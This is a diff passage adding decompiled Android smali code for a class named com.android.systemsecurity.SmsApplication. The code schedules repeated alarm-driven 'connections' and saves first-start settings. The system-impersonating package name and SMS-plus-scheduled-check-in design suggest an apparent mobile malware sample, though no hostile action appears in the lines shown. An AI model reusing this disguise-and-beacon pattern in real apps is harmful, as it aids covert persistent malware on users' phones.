+    iget-wide v9, v9, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    invoke-static {v9, v10}, Lcom/android/systemsecurity/SmsApplication;->millsToString(J)Ljava/lang/String;
+
+    move-result-object v9
+
+    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v8
+
+    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-static {v7, v8}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+
+    .line 136
+    new-instance v7, Ljava/lang/StringBuilder;
+
+    const-string v8, "SmsApplication Not first start, triger time is left, next time to connect = "
+
+    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    sget-object v8, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v8, v8, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v8, v8, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    invoke-static {v8, v9}, Lcom/android/systemsecurity/SmsApplication;->millsToString(J)Ljava/lang/String;
+
+    move-result-object v8
+
+    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    move-result-object v7
+
+    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v7
+
+    invoke-static {v7, p0}, Lcom/android/systemsecurity/SmsApplication;->logStat(Ljava/lang/String;Landroid/content/Context;)V
+
+    .line 139
+    new-instance v1, Landroid/content/Intent;
+
+    const-class v7, Lcom/android/systemsecurity/RepeatingAlarmService;
+
+    invoke-direct {v1, p0, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+
+    .line 140
+    .restart local v1       #intent:Landroid/content/Intent;
+    invoke-static {p0, v14, v1, v12}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
+
+    move-result-object v6
+
+    .line 141
+    .restart local v6       #pendingIntent:Landroid/app/PendingIntent;
+    invoke-virtual {p0, v6}, Lcom/android/systemsecurity/SmsApplication;->cancelAlarmScheduler(Landroid/app/PendingIntent;)V
+
+    .line 142
+    const-string v7, "alarm"
+
+    invoke-virtual {p0, v7}, Lcom/android/systemsecurity/SmsApplication;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
+
+    move-result-object v0
+
+    check-cast v0, Landroid/app/AlarmManager;
+
+    .line 145
+    .restart local v0       #alarmManager:Landroid/app/AlarmManager;
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iget-wide v7, v7, Lcom/android/systemsecurity/SettingsSet;->nextTimeConnection:J
+
+    .line 143
+    invoke-virtual {v0, v12, v7, v8, v6}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V
+
+    .line 148
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    iget-object v7, v7, Lcom/android/systemsecurity/Settings;->saved:Lcom/android/systemsecurity/SettingsSet;
+
+    iput-boolean v12, v7, Lcom/android/systemsecurity/SettingsSet;->isFirstStart:Z
+
+    .line 149
+    sget-object v7, Lcom/android/systemsecurity/SmsApplication;->settings:Lcom/android/systemsecurity/Settings;
+
+    invoke-virtual {v7, p0}, Lcom/android/systemsecurity/Settings;->save(Landroid/content/Context;)Z
+
+    goto/16 :goto_0
+.end method
